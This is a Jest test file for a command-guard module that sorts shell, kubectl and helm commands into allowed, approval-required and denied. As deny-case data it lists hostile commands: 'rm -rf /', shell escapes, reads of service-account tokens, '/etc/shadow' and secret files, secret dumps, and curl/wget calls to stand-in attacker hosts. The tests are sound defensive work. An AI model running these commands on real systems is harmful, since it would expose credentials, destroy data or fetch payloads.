import {
  validateCommand,
  normalizeCommand,
} from '../../../src/lib/command-guard';

describe('command-guard', () => {
  describe('normalizeCommand', () => {
    it('trims and collapses whitespace', () => {
      expect(normalizeCommand('  kubectl   get   pods  ')).toBe('kubectl get pods');
    });

    it('joins multiline into a single line', () => {
      expect(normalizeCommand('kubectl get\npods')).toBe('kubectl get pods');
    });
  });

  describe('validateCommand', () => {
    it('denies empty commands', () => {
      const r = validateCommand('   ');
      expect(r.allowed).toBe(false);
      expect(r.riskLevel).toBe('denied');
      expect(r.matchedPolicy).toBe('empty-command');
    });

    it('denies shell chaining', () => {
      const r = validateCommand('kubectl get pods && rm -rf /');
      expect(r.allowed).toBe(false);
      expect(r.matchedPolicy).toBe('deny-shell-chaining');
    });

    it('allows read-only kubectl get', () => {
      const r = validateCommand('kubectl get pods -n default');
      expect(r.allowed).toBe(true);
      expect(r.riskLevel).toBe('read');
      expect(r.requiresConfirm).toBe(false);
      expect(r.requiresHumanApproval).toBe(false);
      expect(r.matchedPolicy).toBe('kubectl-get');
    });

    it('allows kubectl logs as read', () => {
      const r = validateCommand('kubectl logs my-pod -n apps');
      expect(r.allowed).toBe(true);
      expect(r.riskLevel).toBe('read');
    });

    it('classifies rollout restart as mutating with reason', () => {
      const r = validateCommand('kubectl rollout restart deployment/api -n apps');
      expect(r.allowed).toBe(true);
      expect(r.riskLevel).toBe('mutating');
      expect(r.requiresConfirm).toBe(true);
      expect(r.requiresReason).toBe(true);
      expect(r.requiresHumanApproval).toBe(false);
    });

    it('classifies kubectl delete as destructive requiring human approval', () => {
      const r = validateCommand('kubectl delete pod evil -n apps');
      expect(r.allowed).toBe(true);
      expect(r.riskLevel).toBe('destructive');
      expect(r.requiresHumanApproval).toBe(true);
      expect(r.requiresConfirm).toBe(true);
      expect(r.requiresReason).toBe(true);
    });

    it('denies rm -rf /', () => {
      const r = validateCommand('rm -rf /');
      expect(r.allowed).toBe(false);
      expect(r.riskLevel).toBe('denied');
    });

    it('denies unknown commands', () => {
      const r = validateCommand('nmap -A 192.168.0.1');
      expect(r.allowed).toBe(false);
      expect(r.matchedPolicy).toBe('no-matching-policy');
    });

    it('denies drop database', () => {
      const r = validateCommand('DROP DATABASE production');
      expect(r.allowed).toBe(false);
      expect(r.riskLevel).toBe('denied');
    });
  });

  describe('bypass regressions (H1)', () => {
    it.each([
      'env sh -c "id"',
      'env',
      'env -i /bin/sh -c id',
      'printenv',
      'printenv JWT_SECRET',
      'cat /var/run/secrets/kubernetes.io/serviceaccount/token',
      'cat /etc/platform/.env',
      'head -c 4096 /var/run/secrets/kubernetes.io/serviceaccount/token',
      'tail /etc/shadow',
      'wc /etc/platform/.env',
      'ls /etc/platform',
      'ps eww',
      'date -s 2020-01-01',
      'hostname attacker',
      '/usr/bin/env sh -c id',
      'KUBECTL get pods',
      '"env" sh -c id',
      'xargs sh -c id',
      'kubectl exec -it api -- sh',
      'kubectl get pods $(id)',
    ])('denies %s', (cmd) => {
      const r = validateCommand(cmd);
      expect(r.allowed).toBe(false);
      expect(r.riskLevel).toBe('denied');
    });

    it('parses the curl/wget URL host exactly', () => {
      for (const cmd of [
        'curl https://github.com.attacker.net/x',
        'curl https://registry.attacker.net/x',
        'wget https://ghcr.io.evil.example/payload',
        'curl https://github.com@evil.example/',
      ]) {
        const r = validateCommand(cmd);
        expect(r.allowed).toBe(false);
        expect(r.matchedPolicy).toBe('deny-arbitrary-remote');
      }
    });

    it.each([
      'kubectl get secret db -o yaml',
      'kubectl get secrets -n platform -o json',
      'kubectl get secret db -ojsonpath={.data.password}',
      'kubectl get secret/db --output=yaml',
      'kubectl get pods,secrets -o yaml',
      'kubectl get secret db -o go-template={{.data}}',
      'kubectl get secret db --template={{.data}}',
      'kubectl get --raw /api/v1/namespaces/platform/secrets',
      'helm get values platform -n platform',
    ])('requires human approval to read secret material: %s', (cmd) => {
      const r = validateCommand(cmd);
      expect(r.allowed).toBe(true);
      expect(r.requiresHumanApproval).toBe(true);
      expect(r.requiresReason).toBe(true);
    });

    it('keeps listing secrets (no values) as a plain read', () => {
      const r = validateCommand('kubectl get secrets -n platform');
      expect(r.allowed).toBe(true);
      expect(r.requiresHumanApproval).toBe(false);
    });

    it.each([
      'kubectl apply -f deploy.yaml',
      'kubectl create deployment x --image=nginx',
      'kubectl delete pod x',
      'kubectl scale deployment/api --replicas=0',
      'kubectl patch deployment api -p {}',
      'kubectl edit deployment api',
      'helm install x ./chart',
      'helm upgrade platform ./chart',
      'helm uninstall platform',
    ])('requires human approval for %s', (cmd) => {
      const r = validateCommand(cmd);
      expect(r.allowed).toBe(true);
      expect(r.requiresHumanApproval).toBe(true);
      expect(r.requiresConfirm).toBe(true);
      expect(r.requiresReason).toBe(true);
    });

    it.each([
      'kubectl get pods --kubeconfig=/tmp/evil',
      'kubectl get pods --server https://evil.example',
      'kubectl get pods --token abc',
      'kubectl get pods --as=system:admin',
      'helm upgrade x ./c --post-renderer /bin/sh',
    ])('denies client override flags: %s', (cmd) => {
      const r = validateCommand(cmd);
      expect(r.allowed).toBe(false);
      expect(r.matchedPolicy).toBe('deny-client-override-flags');
    });

    it.each(['uname -a', 'df -h', 'free -m', 'uptime', 'whoami', 'ps aux', 'kubectl rollout status deployment/api'])(
      'still allows harmless reads: %s',
      (cmd) => {
        const r = validateCommand(cmd);
        expect(r.allowed).toBe(true);
        expect(r.riskLevel).toBe('read');
        expect(r.requiresHumanApproval).toBe(false);
      },
    );
  });
});
